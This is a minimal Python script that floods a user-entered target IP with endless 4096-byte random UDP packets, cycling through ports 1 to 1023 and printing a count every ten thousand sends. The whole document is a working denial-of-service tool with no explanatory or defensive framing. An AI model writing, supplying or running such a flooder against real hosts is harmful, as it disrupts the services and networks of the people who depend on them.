import socket, random; sock, bytes, port, send, ip = socket.socket(socket.AF_INET,socket.SOCK_DGRAM), random._urandom(4096), 1, 0, input('Target IP: ')
while 1:
    sock.sendto(bytes,(ip,port)); send += 1; port += 1
    if port > 1023: port = 1
    if not send % 10000: print(send)